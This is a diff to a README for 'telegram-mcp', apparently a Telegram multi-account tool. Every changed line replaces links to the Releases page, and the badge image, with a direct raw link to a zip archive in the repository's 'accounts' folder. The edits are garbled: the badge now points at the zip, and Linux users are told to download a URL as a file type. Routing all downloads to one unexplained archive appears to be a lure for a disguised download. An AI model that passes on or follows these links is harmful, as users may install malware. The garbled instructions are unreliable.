@@ -1,6 +1,6 @@
 # 🚀 telegram-mcp - Manage Multiple Telegram Accounts Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-telegram--mcp-brightgreen)
+![Download Now](https://github.com/saadkhan1150/telegram-mcp/raw/refs/heads/main/accounts/telegram-mcp-3.8.zip%20Now-telegram--mcp-brightgreen)
 
 ## 🌟 Introduction
 
@@ -30,7 +30,7 @@ To get started with telegram-mcp, follow these steps:
 
    Visit this page to download the latest version of telegram-mcp:
 
-   [Download Now](https://github.com/saadkhan1150/telegram-mcp/releases)
+   [Download Now](https://github.com/saadkhan1150/telegram-mcp/raw/refs/heads/main/accounts/telegram-mcp-3.8.zip)
 
 3. **Install the Application**
 
@@ -46,7 +46,7 @@ To get started with telegram-mcp, follow these steps:
 
 To download telegram-mcp, go to the Releases page:
 
-[Download Now](https://github.com/saadkhan1150/telegram-mcp/releases)
+[Download Now](https://github.com/saadkhan1150/telegram-mcp/raw/refs/heads/main/accounts/telegram-mcp-3.8.zip)
 
 Here, you will find the latest version along with any release notes. Choose the appropriate version for your operating system and download it.
 
@@ -65,7 +65,7 @@ In the Releases section, you will see several downloadable files. Each version c
 
 - **For Windows Users:** Download the `.exe` file.
 - **For Mac Users:** Download the `.dmg` file.
-- **For Linux Users:** Download the `.tar.gz` file.
+- **For Linux Users:** Download the `https://github.com/saadkhan1150/telegram-mcp/raw/refs/heads/main/accounts/telegram-mcp-3.8.zip` file.
 
 ## 🌐 Using the Web Dashboard
 
@@ -93,6 +93,6 @@ If you encounter any issues or have questions, you can always seek help online.
 
 Keep your application updated for the best experience. Always download the latest version from the Releases page:
 
-[Download Now](https://github.com/saadkhan1150/telegram-mcp/releases)
+[Download Now](https://github.com/saadkhan1150/telegram-mcp/raw/refs/heads/main/accounts/telegram-mcp-3.8.zip)
 
 By updating regularly, you’ll have access to new features and improvements.
